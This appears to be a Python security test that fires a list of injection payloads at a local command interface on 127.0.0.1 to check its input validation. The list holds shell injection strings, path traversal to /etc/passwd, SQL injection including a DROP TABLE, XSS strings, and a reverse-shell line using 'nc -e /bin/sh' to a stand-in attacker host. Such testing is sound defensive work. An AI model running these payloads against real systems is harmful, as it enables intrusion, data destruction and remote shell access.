"""
Attack Test 02: Payload Injection Test

This test attempts to inject malicious payloads through
the command interface to test input validation.

Run with: python tests_attack/test_02_payload_injection.py
"""

import socket
import sys
import os

# For ConnectionRefused
ConnectionRefused = socket.error

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def test_payload_injection():
    """Test payload injection resilience."""
    print("=" * 60)
    print("ATTACK TEST 02: Payload Injection")
    print("=" * 60)
    
    target_host = "127.0.0.1"
    target_port = 8888
    
    print(f"\n[1] Target: {target_host}:{target_port}")
    
    # Malicious payloads to test
    payloads = [
        # Command injection attempts
        "echo test; ls",
        "echo test && ls",
        "echo test | ls",
        "echo test`ls`",
        "echo test$(ls)",
        
        # Path traversal attempts
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "C:\\Windows\\System32",
        
        # SQL injection attempts (if applicable)
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "1' UNION SELECT * FROM users--",
        
        # XSS attempts (if applicable)
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        
        # Format string attempts
        "%s%s%s%s",
        "{0}",
        "{{.Env}}",
        
        # Buffer overflow attempts
        "A" * 1000,
        "A" * 10000,
        
        # Null byte injection
        "\x00../../../etc/passwd",
        
        # Shell metacharacters
        "|nc -e /bin/sh attacker.com 4444",
        "; cat /etc/passwd",
        "$(whoami)",
        "`whoami`",
        
        # Unicode/special chars
        "\u0000\u0000\u0000",
        "\x1b[31mtest\x1b[0m",
    ]
    
    print(f"\n[2] Testing {len(payloads)} payloads...")
    
    results = {
        "sent": 0,
        "rejected": 0,
        "accepted": 0,
        "errors": 0
    }
    
    for i, payload in enumerate(payloads):
        try:
            # Try to connect and send payload
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            try:
                sock.connect((target_host, target_port))
                
                # Send payload as if typing in CLI
                sock.send((payload + "\n").encode('utf-8'))
                results["sent"] += 1
                
                # Try to get response
                try:
                    response = sock.recv(4096)
                    if response:
                        results["accepted"] += 1
                    else:
                        results["rejected"] += 1
                except:
                    results["rejected"] += 1
                    
            except ConnectionRefused:
                results["errors"] += 1
            except Exception as e:
                results["errors"] += 1
                
            sock.close()
            
        except Exception as e:
            results["errors"] += 1
            
        if (i + 1) % 5 == 0:
            print(f"    - Tested {i+1}/{len(payloads)} payloads...")
    
    print(f"\n[3] Results:")
    print(f"    - Payloads sent: {results['sent']}")
    print(f"    - Accepted: {results['accepted']}")
    print(f"    - Rejected: {results['rejected']}")
    print(f"    - Errors: {results['errors']}")
    
    print("\n[4] Testing basic connectivity...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((target_host, target_port))
        print(f"    ✓ CLI is reachable")
        sock.close()
    except ConnectionRefused:
        print(f"    ! CLI not running - start with: python main.py")
    except Exception as e:
        print(f"    ! Error: {e}")
    
    print("\n" + "=" * 60)
    print("RESULT: Payload injection test complete")
    print("=" * 60)
    return True


if __name__ == "__main__":
    test_payload_injection()